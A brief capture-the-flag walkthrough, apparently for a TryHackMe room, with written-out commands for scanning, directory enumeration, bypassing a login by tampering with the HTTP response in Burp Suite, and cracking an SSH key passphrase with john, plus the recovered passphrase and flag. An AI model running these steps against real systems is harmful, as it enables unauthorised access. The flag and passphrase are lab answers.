1. Recon
   - `nmap -sV -sC -vv -A -T5 10.10.117.88`
   - ports discovered: 22 & 80


2. Enumerate the directories with dirbuster
   - `dirbuster -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://<target-ip>` 


3. failed attempts
   - /admin is SQLi protected
   - basic credentials like admin and guest with passwords admin and 12345 didn't work

4. Discoveries
   - found logic behind the login and ended up trying to bypass it with burp suite

 5. bypass the login logic with burp suite
    - installed foxyproxy extension on the browser and created a simple listener on 127.0.0.1:8080 that burp would use
    - used the Proxy tab in burp to intercept the login request and and configured it to receive the response to the login request
    - altered the login failure to a redirect to the page
      ```sh
      HTTP/1.1 302 FOUND
      Date: Mon, 20 Jul 2020 14:33:13 GMT
      Content-Length: 21
      Content-Type: text/plain; charset=utf-8
      Connection: close
      location: /admin
      ```
    - refreshed the webpage and got into a new page that had a private key in in belonging to "james"

6. Access to james' session with ssh
   - `ssh -i priv-key james@<target-ip>` < passphrase was found
   - used john to crack the passphrase
     - `ssh2john priv-key > priv-key.hash`
     - `john james-priv.hash --wordlist=/usr/share/wordlists/rockyou.txt`
   - passphrase: james13

7. Accessed james' session and found the first flag
   - thm{65c1aaf000506e56996822c6281e6bf7}



awk -F ',' '{print$2}' stuff.csv | more
awk -F ',' '{print$2}' stuff.csv | sort -u
